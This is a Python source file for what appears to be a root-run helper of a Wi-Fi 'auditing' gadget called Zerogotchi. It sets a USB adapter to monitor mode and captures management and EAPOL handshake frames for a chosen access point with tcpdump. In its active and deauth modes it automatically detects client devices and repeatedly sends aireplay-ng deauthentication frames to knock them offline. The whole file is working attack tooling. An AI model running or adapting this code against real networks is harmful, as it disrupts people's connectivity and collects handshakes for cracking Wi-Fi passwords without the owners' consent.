#!/usr/bin/python3 -I
"""Privileged, targeted auditing on a dedicated USB Wi-Fi PHY."""

import fcntl
from contextlib import ExitStack, contextmanager
from pathlib import Path
import os
import re
import select
import signal
import socket
import struct
import subprocess
import sys
import time


IW = "/usr/sbin/iw"
IP = "/usr/sbin/ip"
TCPDUMP = "/usr/bin/tcpdump"
AIREPLAY = "/usr/sbin/aireplay-ng"
MAC = re.compile(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")


class RadioError(Exception):
    pass


class MonitorStartupError(RadioError):
    pass


def command(*args, check=True):
    return subprocess.run(args, capture_output=True, text=True, timeout=7, check=check)


def valid_mac(value):
    return MAC.fullmatch(value) and not (int(value[:2], 16) & 1) and int(value.replace(":", ""), 16)


def usb_phy(interface):
    net = Path("/sys/class/net")
    device = net / interface / "device"
    phy = net / interface / "phy80211"
    if not device.exists() or not phy.exists():
        raise RadioError("Capture adapter not found")
    if not any((parent / "subsystem").resolve().name == "usb" for parent in device.resolve().parents):
        raise RadioError("Use a dedicated USB Wi-Fi adapter")
    return phy.resolve()


def dedicated_phy(interface):
    net = Path("/sys/class/net")
    phy = usb_phy(interface)
    active_links = []
    for link in net.iterdir():
        if (link / "phy80211").resolve() != phy:
            continue
        state = command(IW, "dev", link.name, "info").stdout
        status = command(IW, "dev", link.name, "link", check=False).stdout
        if "type managed" not in state or status.strip() != "Not connected.":
            raise RadioError("Disconnect the USB adapter first")
        if int((link / "flags").read_text(), 16) & 1:
            active_links.append(link.name)
    modes = command(IW, "phy", phy.name, "info").stdout
    if not re.search(r"^\s*\* monitor\s*$", modes, re.MULTILINE):
        raise RadioError("The USB adapter lacks monitor mode")
    return phy.name, active_links


def stop(process, sig):
    if process is None:
        return
    if process.poll() is None:
        process.send_signal(sig)
    try:
        process.wait(timeout=3)
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait()


def station_address(packet, bssid):
    if len(packet) < 8 or packet[0] != 0:
        return None
    offset = struct.unpack_from("<H", packet, 2)[0]
    if offset < 8 or len(packet) < offset + 24:
        return None
    control, direction = packet[offset:offset + 2]
    if control & 0x0c != 8:
        return None
    receiver = packet[offset + 4:offset + 10]
    sender = packet[offset + 10:offset + 16]
    if direction & 3 == 1 and receiver == bssid:
        station = sender
    elif direction & 3 == 2 and sender == bssid:
        station = receiver
    else:
        return None
    if station != bssid and any(station) and not station[0] & 1:
        return station.hex(":")


def progress(message):
    print("ZG STATUS " + message, file=sys.stderr, flush=True)


def run_session(monitor, bssid, mode):
    capture = injection = stations_socket = None
    stations = {}
    last_attempt = {}
    attempts = failures = sent = 0
    last_report = 0.0
    next_attempt = 0.0
    last_state = None
    ap = bytes.fromhex(bssid.replace(":", ""))
    try:
        if mode != "deauth":
            capture = subprocess.Popen(
                [TCPDUMP, "-i", monitor, "-s", "0", "-U", "-w", "-",
                 f"wlan host {bssid} and (type mgt or ether proto 0x888e)"],
                stdin=subprocess.DEVNULL,
            )
        if mode != "passive":
            stations_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
            stations_socket.bind((monitor, 0))
            stations_socket.setblocking(False)
        readers = [sys.stdin]
        if stations_socket is not None:
            readers.append(stations_socket)
        progress("Radio ready. Listening on selected channel.")
        while True:
            readable, _, _ = select.select(readers, [], [], 0.2)
            if sys.stdin in readable and not sys.stdin.buffer.read1(1):
                break
            if capture is not None and capture.poll() is not None:
                raise RadioError("Capture tool exited early")
            now = time.monotonic()
            if stations_socket in readable:
                for _ in range(64):
                    try:
                        packet = stations_socket.recv(4096)
                    except BlockingIOError:
                        break
                    station = station_address(packet, ap)
                    if station:
                        stations[station] = now
            if injection is not None:
                status = injection.poll()
                if status is None and now - injection_started >= 8:
                    stop(injection, signal.SIGTERM)
                    status = 1
                if status is not None:
                    failures += int(status != 0)
                    if status == 0:
                        sent += 2
                    injection = None
            if stations_socket is not None and injection is None and now >= next_attempt:
                # A client must have been seen recently on the selected BSSID.
                eligible = (mac for mac, seen in stations.items()
                            if now - seen <= 30 and now - last_attempt.get(mac, -60) >= 15)
                station = min(eligible, key=lambda mac: last_attempt.get(mac, -60), default=None)
                if station is not None:
                    injection = subprocess.Popen(
                        [AIREPLAY, "--deauth", "2", "-a", bssid, "-c", station, monitor],
                        stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    )
                    injection_started = last_attempt[station] = now
                    next_attempt = now + 1
                    attempts += 1
            state = ("Deauthing" if injection is not None else "Listening", sent)
            if state != last_state:
                print(f"ZG STATE {state[0]} {state[1]}", file=sys.stderr, flush=True)
                last_state = state
            if stations_socket is not None and now - last_report >= 2:
                for mac in tuple(stations):
                    if now - stations[mac] > 60:
                        del stations[mac]
                        last_attempt.pop(mac, None)
                progress(f"Clients seen: {len(stations)}   Deauth attempts: {attempts} | Failed attempts: {failures}")
                last_report = now
    finally:
        stop(injection, signal.SIGTERM)
        stop(capture, signal.SIGINT)
        if stations_socket is not None:
            stations_socket.close()


@contextmanager
def monitor_interface(interface):
    phy, active_links = dedicated_phy(interface)
    monitor = f"zgmon{os.getpid()}"
    created = False
    restore_links = []
    try:
        for link in active_links:
            command(IP, "link", "set", "dev", link, "down")
            restore_links.append(link)
        command(IW, "phy", phy, "interface", "add", monitor, "type", "monitor")
        created = True
        try:
            command(IP, "link", "set", "dev", monitor, "up")
        except subprocess.CalledProcessError as error:
            raise MonitorStartupError("USB monitor startup failed. Reconnect the adapter and retry.") from error
        yield monitor
    finally:
        try:
            if created:
                command(IW, "dev", monitor, "del")
        finally:
            for link in restore_links:
                command(IP, "link", "set", "dev", link, "up", check=False)


def reset_realtek(interface):
    usb_phy(interface)
    device = (Path("/sys/class/net") / interface / "device").resolve()
    usb = device.parent
    if ((device / "driver").resolve().name != "rtw88_8821cu"
            or (usb / "idVendor").read_text().strip() != "0bda"
            or (usb / "idProduct").read_text().strip() != "c811"):
        return False
    bus, address = (int((usb / name).read_text()) for name in ("busnum", "devnum"))
    # USBDEVFS_RESET resets this USB device, without changing its driver or firmware.
    with open(f"/dev/bus/usb/{bus:03}/{address:03}", "wb", buffering=0) as handle:
        fcntl.ioctl(handle, 0x5514)
    for _ in range(20):
        time.sleep(0.25)
        if (Path("/sys/class/net") / interface / "phy80211").exists():
            return True
    return False


@contextmanager
def ready_monitor(interface):
    with ExitStack() as stack:
        try:
            monitor = stack.enter_context(monitor_interface(interface))
        except MonitorStartupError as error:
            try:
                recovered = reset_realtek(interface)
            except (OSError, RadioError):
                recovered = False
            if not recovered:
                raise error
            monitor = stack.enter_context(monitor_interface(interface))
        yield monitor


def lock_radio(lock, name):
    try:
        fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except BlockingIOError as error:
        raise RadioError(f"Another {name} is running") from error


def tuned_session(monitor, freq, bssid, mode):
    try:
        command(IW, "dev", monitor, "set", "freq", freq)
    except subprocess.CalledProcessError as error:
        raise RadioError(f"Could not tune USB adapter to {freq} MHz") from error
    run_session(monitor, bssid, mode)

def main(args):
    if os.geteuid() != 0:
        raise RadioError("Capture helper requires approved sudo access")
    if args == ["gnss"]:
        rail = Path("/sys/class/leds/ext_5v_out/brightness")
        with open("/run/zerogotchi-gnss.lock", "a", encoding="ascii") as lock:
            lock_radio(lock, "GNSS session")
            was_off = rail.read_text().strip() == "0"
            if was_off:
                rail.write_text("1")
            try:
                while sys.stdin.buffer.read(64):
                    pass
            finally:
                if was_off:
                    rail.write_text("0")
        return
    if len(args) not in (2, 4, 5):
        raise RadioError("Invalid radio request")
    interface = args[0]
    if not re.fullmatch(r"[A-Za-z0-9_][A-Za-z0-9_.-]{0,14}", interface):
        raise RadioError("Invalid adapter name")
    if len(args) == 2:
        if args[1] != "hold":
            raise RadioError("Invalid radio mode")
        with open("/run/zerogotchi-radio.lock", "a", encoding="ascii") as lock:
            lock_radio(lock, "radio session")
            with ready_monitor(interface) as monitor:
                print(monitor, flush=True)
                while sys.stdin.buffer.read(64):
                    pass
        return
    _, freq, bssid, mode, *leased = args
    if mode not in ("passive", "active", "deauth"):
        raise RadioError("Invalid radio mode")
    if not re.fullmatch(r"[0-9]{4}", freq) or not 2412 <= int(freq) <= 7115:
        raise RadioError("Unsupported Wi-Fi frequency")
    if not valid_mac(bssid):
        raise RadioError("Invalid AP MAC")
    if mode != "passive" and int(freq) >= 5925:
        raise RadioError("Deauth is unavailable on 6 GHz")

    if leased:
        monitor = leased[0]
        if not re.fullmatch(r"zgmon[0-9]{1,10}", monitor) or (
            Path("/sys/class/net") / monitor / "phy80211"
        ).resolve() != usb_phy(interface) or "type monitor" not in command(IW, "dev", monitor, "info").stdout:
            raise RadioError("Auto monitor interface is unavailable")
        with open("/run/zerogotchi-target.lock", "a", encoding="ascii") as lock:
            lock_radio(lock, "capture")
            tuned_session(monitor, freq, bssid, mode)
    else:
        with open("/run/zerogotchi-radio.lock", "a", encoding="ascii") as lock:
            lock_radio(lock, "radio session")
            with ready_monitor(interface) as monitor:
                tuned_session(monitor, freq, bssid, mode)


def interrupted(signum, frame):
    raise RadioError("Capture interrupted")


if __name__ == "__main__":
    signal.signal(signal.SIGTERM, interrupted)
    signal.signal(signal.SIGHUP, interrupted)
    signal.signal(signal.SIGINT, interrupted)
    try:
        main(sys.argv[1:])
    except RadioError as error:
        sys.exit(f"ZEROGOTCHI: {error}")
    except subprocess.CalledProcessError as error:
        sys.exit(f"ZEROGOTCHI: {Path(error.cmd[0]).name} failed. Check adapter/channel.")
    except (OSError, subprocess.TimeoutExpired):
        sys.exit("ZEROGOTCHI: Radio setup or cleanup failed")
